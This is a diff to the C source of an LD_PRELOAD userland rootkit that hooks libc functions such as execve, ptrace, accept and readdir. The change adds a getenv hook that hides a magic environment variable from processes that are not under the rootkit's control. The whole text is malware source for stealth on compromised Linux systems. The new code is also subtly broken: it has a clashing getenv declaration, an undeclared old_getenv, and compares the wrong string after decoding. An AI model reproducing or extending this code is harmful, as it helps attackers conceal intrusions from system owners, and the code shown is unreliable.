@@ -22,12 +22,13 @@
 #include "rkconst.h"
 //function pointers to hooked functions
 
-//misc
+// too lazy to group these hooks
 int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
 char *(*old_fgets)(char *s, int size, FILE *stream);
 long int (*old_ptrace)(enum __ptrace_request request, ...);
 off_t (*old_lseek)(int fildes, off_t offset, int whence);
 int (*old_accept)(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
+char *(*getenv)(const char *name);
 
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
@@ -116,6 +117,23 @@ void __attribute ((constructor)) init(void)
 	printf("==========LOADED==========\n");
 	#endif 
 } 
+
+char *getenv(const char *name)
+{ 
+	HOOK(getenv); 
+	#ifdef DEBUG 
+	printf("[!] getenv hooked\n"); 
+	#endif 
+
+	if (owned()) return old_getenv(name); 
+	char *magicenv = strdup(MAGICENV); xor(magicenv); 
+	if (!strcmp(MAGICENV, name))
+	{ 
+		return NULL; // lol hidden
+	}
+	return old_getenv(name);
+}
+
 
 long int ptrace(enum __ptrace_request request, ...)
 {
